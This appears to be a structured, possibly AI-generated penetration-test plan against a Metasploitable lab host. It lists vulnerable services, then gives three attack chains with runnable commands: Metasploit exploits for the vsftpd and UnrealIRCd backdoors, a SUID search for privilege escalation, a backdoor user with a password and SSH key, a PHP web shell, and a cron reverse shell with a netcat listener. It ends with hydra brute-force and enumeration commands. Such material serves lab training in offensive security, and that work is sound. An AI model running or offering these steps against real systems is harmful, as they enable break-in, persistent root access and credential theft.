summary: vsftpd 2.3.4 backdoor on TCP/21 (high-risk exploit available)
Samba usermap_script vulnerability on TCP/139 and 445 (CVE-2007-2447, high-risk)
Apache Tomcat manager upload on TCP/8180 (high-risk, weak creds likely)
distcc_exec on TCP/1524 (CVE-2004-2687, root shell access)
Java RMI server on TCP/1099 (high-risk exploit)
MySQL remote auth on TCP/3306 (medium-risk login)
SSH weak credentials on TCP/22 (msfadmin/msfadmin likely)

attack_chains.name: Chain 1: FTP Backdoor to Shell to Persistence via Cron

stages.description: Exploit vsftpd backdoor for root shell
commands: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'
verification: Check for Meterpreter or shell prompt after exploit execution; use 'sessions -l' in msfconsole to list active sessions

stages.description: Backdoor provides root access directly; verify and stabilize shell
Add cron job for reverse shell
verification: cat /etc/crontab to confirm entry; wait 1 minute and check listener with 'nc -lvnp 4444' on attacker machine

attack_chains.name: Chain 2: Samba Exploit to User Shell to Privesc via SUID to Backdoor

stages.description: Exploit Samba usermap_script for command execution
verification: Look for successful command execution output in msfconsole; attempt to spawn shell with payload

stages.description: Use find for SUID binaries and exploit for root
commands: In shell: find / -perm -4000 2>/dev/null; ./find_suid_helper (if available) or manual exploit
verification: whoami before/after; expect escalation to root via known Metasploitable SUID

stages.description: Install backdoor user and SSH key
commands: In root shell: useradd -m backdoor -s /bin/bash; echo 'backdoor:password' | chpasswd; mkdir -p /home/backdoor/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker_key' >> /home/backdoor/.ssh/authorized_keys; chmod 600 /home/backdoor/.ssh/authorized_keys; chown -R backdoor:backdoor /home/backdoor/.ssh
verification: su backdoor; ssh backdoor@192.168.56.5 from attacker to test persistent access

attack_chains.name: Chain 3: IRC Backdoor to Root to Persistence via Web Shell

stages.description: Exploit UnrealIRCd backdoor for root shell
commands: msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'
verification: Monitor for shell connection in msfconsole; use 'sessions -i 1' to interact

stages.description: Direct root from backdoor; confirm privileges
verification: Output shows root user; list sudoers if needed

stages.description: Upload PHP web shell to Apache directory
commands: In root shell: echo '<?php system($_GET["cmd"]); ?>' > /var/www/web-shell.php; chmod 644 /var/www/web-shell.php
verification: curl 'http://192.168.56.5/web-shell.php?cmd=id' from attacker; expect root output

followup_requests: Run detailed Nikto scan on HTTP port 80: nikto -h 192.168.56.5 -p 80 -o nikto_80.txt
Enumerate Tomcat manager credentials on port 8180: hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.5 http-get /manager/html
Full enum4linux on Samba: enum4linux -a 192.168.56.5 > enum4linux.txt
MySQL version-specific vuln check: mysql -h 192.168.56.5 -u root -p'' -e 'SELECT version();'
Gobuster deeper dir enum on port 80: gobuster dir -u http://192.168.56.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
